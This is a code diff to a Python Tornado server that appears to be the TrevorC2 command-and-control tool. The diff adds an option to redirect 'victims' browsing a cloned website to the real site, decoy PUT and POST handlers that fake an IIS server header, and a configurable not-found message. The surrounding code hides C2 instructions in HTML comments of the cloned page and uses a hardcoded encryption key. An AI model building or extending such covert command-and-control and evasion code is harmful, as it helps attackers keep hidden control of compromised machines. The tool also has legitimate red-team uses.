@@ -36,10 +36,16 @@ STUB = ("oldcss=")
 
 # Turn to True for SSL support
 SSL = False
-CERT_FILE = ""  # Your Certificate for SSL
+CERT_FILE = ("")  # Your Certificate for SSL
 
 # THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
 CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
+
+# Response for website when browsing directories that do not exist if directly going to SITE_PATH_QUERY
+NOTFOUND=("Page not found.")
+
+# Redirect the victim if browsing website to the cloned URL instead of presenting it. ON/OFF
+REDIRECT =("ON")
 
 # DO NOT CHANGE BELOW THIS LINE
 
@@ -211,11 +217,29 @@ class UnknownPageHandler(tornado.web.RequestHandler):
         remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
         log.warning('Request to Invalid Page from {}'.format(remote_ip))
         self.set_header('Server', 'IIS')
-        site_data = open("clone_site/index.html", "r").read()
-        self.write(site_data)
-        #self.write('{"status": "ERROR: Unknown API Endpoint."}\n')
+        if REDIRECT.lower() == ("on"):
+            self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (URL))
+        else:
+            site_data = open("clone_site/index.html", "r").read()
+            self.write(site_data)
+            #self.write('{"status": "ERROR: Unknown API Endpoint."}\n')
         return
 
+    def put(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type PUT identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
+
+    def post(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type POST identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
 
 class RPQ(tornado.web.RequestHandler):
     """Output IP address and close."""
@@ -231,11 +255,31 @@ class RPQ(tornado.web.RequestHandler):
             sid = self.get_cookie(COOKIE_SESSIONID_STRING)
             instructions = instructionsdict[sid]
         else:
-            instructions = ""
+            instructions = ("")
             print("[!] Somebody without a cookie accessed the website from {}".format(remote_ip))
-        site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
-        self.write(str(site_data))
 
+        # If we want to redirect them to the site we cloned instead of showing them a cloned copy of the site
+        if REDIRECT.lower() == ("on"):
+            self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (URL))
+        else:
+            site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
+            self.write(str(site_data))
+
+    def put(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type PUT identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
+
+    def post(self):
+        """Get Handler."""
+        x_real_ip = self.request.headers.get("X-Forwarded-For")
+        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
+        log.warning('Invalid request type POST identified {}'.format(remote_ip))
+        self.set_header('Server', 'IIS')
+        return
 
 class SPQ(tornado.web.RequestHandler):
     """Output IP address and close."""
@@ -249,7 +293,7 @@ class SPQ(tornado.web.RequestHandler):
 
         args = self.request.arguments
         if not args:
-            self.write('CACHE: FILE NOT FOUND\r\n')
+            self.write('%s\r\n' % (NOTFOUND))
             return
         for param in args:
             if param in (QUERY_STRING):
